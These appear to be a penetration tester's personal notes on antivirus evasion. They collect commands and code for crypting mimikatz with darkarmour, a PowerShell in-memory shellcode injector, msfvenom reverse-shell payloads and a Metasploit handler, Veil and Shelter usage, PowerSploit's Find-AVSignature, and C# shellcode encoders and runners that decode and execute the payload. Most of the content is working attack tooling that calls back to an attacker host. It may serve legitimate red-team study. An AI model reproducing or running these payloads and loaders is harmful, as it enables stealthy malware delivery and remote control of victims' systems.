### Signed Certification
```
Looking for cert:
https://grayhatwarfare.com/

Extract cert information:
openssl pkcs12 -info -in kligo-cert-win.pfx

Brute-force cert password:

```

### Darkarmour
https://github.com/bats3c/darkarmour  
python3 darkarmour.py -f /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -e xor -j -k darkbyte -l 500 -u -o /home/kali/Desktop/b_m.exe
```
 -f FILE, --file FILE  file to crypt, assumed as binary if not told otherwise
  -e ENCRYPT, --encrypt ENCRYPT
                        encryption algorithm to use (xor)
  -S SHELLCODE, --shellcode SHELLCODE
                        file contating the shellcode, needs to be in the
                        'msfvenom -f raw' style format
  -b, --binary          provide if file is a binary exe
  -d, --dll             use reflective dll injection to execute the binary
                        inside another process
  -u, --upx             pack the executable with upx
  -j, --jmp             use jmp based pe loader
  -r, --runpe           use runpe to load pe
  -s, --source          provide if the file is c source code
  -k KEY, --key KEY     key to encrypt with, randomly generated if not
                        supplied
  -l LOOP, --loop LOOP  number of levels of encryption
  -o OUTFILE, --outfile OUTFILE
                        name of outfile, if not provided then random filename
                        is assigned
```
### Remote Process Memory Injection
#### PowerShell In-Memory Injection
```
ps_bypass.ps1:
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here,no quotes here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt64()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

ShellCode: 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.86.133 LPORT=4444 -f powershell(shikata_ga_nai don't work here)

Powershell Execution Policy Config:
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```
### Shelter
```
1. msfconsole:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set LHOST ip
set LPORT port
set AutoRunScript post/windows/manage/migrate
exploit
1.1 metasploit backgroup commands:
bg
show sessions
sessions id
2. Use shelter to inject msfpayload into exe(tracing must be successfully)
```
### Veil framwork
#### evade AV
```
sudo apt -y install veil
sudo /usr/share/veil/config/setup.sh --force --silent
use AV Evasion
set payload 
set LHOST
generate
```
### Find-AVSignature.ps1
```
function Find-AVSignature
{
<#
.SYNOPSIS

Locate tiny AV signatures.

PowerSploit Function: Find-AVSignature
Authors: Chris Campbell (@obscuresec) & Matt Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Locates single Byte AV signatures utilizing the same method as DSplit from "class101" on heapoverflow.com.

.PARAMETER Startbyte

Specifies the first byte to begin splitting on.

.PARAMETER Endbyte

Specifies the last byte to split on.

.PARAMETER Interval

Specifies the interval size to split with.

.PARAMETER Path

Specifies the path to the binary you want tested.

.PARAMETER OutPath

Optionally specifies the directory to write the binaries to.

.PARAMETER BufferLen

Specifies the length of the file read buffer .  Defaults to 64KB.  

.PARAMETER Force

Forces the script to continue without confirmation.    

.EXAMPLE
Import-Module .\Find-AVSignature.ps1
PS C:\> Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force
PS C:\> Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\test\exempt\nc.exe -OutPath c:\test\output\run2 -Verbose -Force
PS C:\> Find-AVSignature -StartByte 16000 -EndByte 17000 -Interval 100 -Path C:\test\exempt\nc.exe -OutPath c:\test\output\run3 -Verbose -Force
PS C:\> Find-AVSignature -StartByte 16800 -EndByte 16900 -Interval 10 -Path C:\test\exempt\nc.exe -OutPath c:\test\output\run4 -Verbose -Force
PS C:\> Find-AVSignature -StartByte 16890 -EndByte 16900 -Interval 1 -Path C:\test\exempt\nc.exe -OutPath c:\test\output\run5 -Verbose -Force

.NOTES

Several of the versions of "DSplit.exe" available on the internet contain malware.

.LINK

http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html
https://github.com/mattifestation/PowerSploit
http://www.exploit-monday.com/
http://heapoverflow.com/f0rums/project.php?issueid=34&filter=changes&page=2
#>

    [CmdletBinding()] Param(
        [Parameter(Mandatory = $True)]
        [ValidateRange(0,4294967295)]
		[UInt32]
        $StartByte,

        [Parameter(Mandatory = $True)]
        [String]
        $EndByte,

        [Parameter(Mandatory = $True)]
        [ValidateRange(0,4294967295)]
		[UInt32]
        $Interval,

        [String]
		[ValidateScript({Test-Path $_ })]
        $Path = ($pwd.path),

        [String]
        $OutPath = ($pwd),
		
		
		[ValidateRange(1,2097152)]
		[UInt32]
		$BufferLen = 65536,
		
        [Switch] $Force
		
    )

    #test variables
    if (!(Test-Path $Path)) {Throw "File path not found"}
    $Response = $True
    if (!(Test-Path $OutPath)) {
        if ($Force -or ($Response = $psCmdlet.ShouldContinue("The `"$OutPath`" does not exist! Do you want to create the directory?",""))){new-item ($OutPath)-type directory}
	}
    if (!$Response) {Throw "Output path not found"}
    if (!(Get-ChildItem $Path).Exists) {Throw "File not found"}
    [Int32] $FileSize = (Get-ChildItem $Path).Length
    if ($StartByte -gt ($FileSize - 1) -or $StartByte -lt 0) {Throw "StartByte range must be between 0 and $Filesize"}
    [Int32] $MaximumByte = (($FileSize) - 1)
    if ($EndByte -ceq "max") {$EndByte = $MaximumByte}
	
	#Recast $Endbyte into an Integer so that it can be compared properly. 
	[Int32]$EndByte = $EndByte 
	
	#If $Endbyte is greater than the file Length, use $MaximumByte.
    if ($EndByte -gt $FileSize) {$EndByte = $MaximumByte}
	
	#If $Endbyte is less than the $StartByte, use 1 Interval past $StartByte.
	if ($EndByte -lt $StartByte) {$EndByte = $StartByte + $Interval}

	Write-Verbose "StartByte: $StartByte"
	Write-Verbose "EndByte: $EndByte"
	
    #find the filename for the output name
    [String] $FileName = (Split-Path $Path -leaf).Split('.')[0]

    #Calculate the number of binaries
    [Int32] $ResultNumber = [Math]::Floor(($EndByte - $StartByte) / $Interval)
    if (((($EndByte - $StartByte) % $Interval)) -gt 0) {$ResultNumber = ($ResultNumber + 1)}
    
    #Prompt user to verify parameters to avoid writing binaries to the wrong directory
    $Response = $True
    if ( $Force -or ( $Response = $psCmdlet.ShouldContinue("This script will result in $ResultNumber binaries being written to `"$OutPath`"!",
             "Do you want to continue?"))){}
    if (!$Response) {Return}
    
    Write-Verbose "This script will now write $ResultNumber binaries to `"$OutPath`"." 
    [Int32] $Number = [Math]::Floor($Endbyte/$Interval)
    
		#Create a Read Buffer and Stream. 
		#Note: The Filestream class takes advantage of internal .NET Buffering.  We set the default internal buffer to 64KB per http://research.microsoft.com/pubs/64538/tr-2004-136.doc.
		[Byte[]] $ReadBuffer=New-Object byte[] $BufferLen
		[System.IO.FileStream] $ReadStream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read, $BufferLen)
		
        #write out the calculated number of binaries
        [Int32] $i = 0
        for ($i -eq 0; $i -lt $ResultNumber + 1 ; $i++)
        {
			# If this is the Final Binary, use $EndBytes, Otherwise calculate based on the Interval
			if ($i -eq $ResultNumber) {[Int32]$SplitByte = $EndByte}
			else {[Int32] $SplitByte = (($StartByte) + (($Interval) * ($i)))}
			
			Write-Verbose "Byte 0 -> $($SplitByte)"
			
			#Reset ReadStream to beginning of file
			$ReadStream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
			
			#Build a new FileStream for Writing
			[String] $outfile = Join-Path $OutPath "$($FileName)_$($SplitByte).bin"
			[System.IO.FileStream] $WriteStream = New-Object System.IO.FileStream($outfile, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None, $BufferLen)
			
			[Int32] $BytesLeft = $SplitByte
			Write-Verbose "$($WriteStream.name)"
			
			#Write Buffer Length to the Writing Stream until the bytes left is smaller than the buffer 
			while ($BytesLeft -gt $BufferLen){
				[Int32]$count = $ReadStream.Read($ReadBuffer, 0, $BufferLen)
				$WriteStream.Write($ReadBuffer, 0, $count)
				$BytesLeft = $BytesLeft - $count
			}
			
			#Write the remaining bytes to the file 
			do {
				[Int32]$count = $ReadStream.Read($ReadBuffer, 0, $BytesLeft)
				$WriteStream.Write($ReadBuffer, 0, $count)
				$BytesLeft = $BytesLeft - $count			
			}
			until ($BytesLeft -eq 0)
			$WriteStream.Close()
			$WriteStream.Dispose()
        }
        Write-Verbose "Files written to disk. Flushing memory."
        $ReadStream.Dispose()
        
		#During testing using large binaries, memory usage was excessive so lets fix that
        [System.GC]::Collect()
        Write-Verbose "Completed!"
}


```
### C#
#### kali install c# compiler
sudo apt update  
sudo apt install mono-complete  
mcs hello.cs  
mono hello.exe
#### C# Shellcode runner by Caesar Cipher shift by 2
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.86.133 LPORT=4444 -f powershell  
encode_cs2.cs
```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
        
        static void Main(string[] args)
        {
            byte[] buf = new byte[460]{shellcode from unencrypted payload of msfvenom in powershell format};
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach(byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2},", b);
            }
            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```
Decode_final_run.cs
```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
        
        static void Main(string[] args)
        {
            byte[] buf = new byte[460]{encoded shellcode from encode_cs2.cs format = "0xff,0xee"};
            for(int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }
            
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
            
        }
    }
}
```
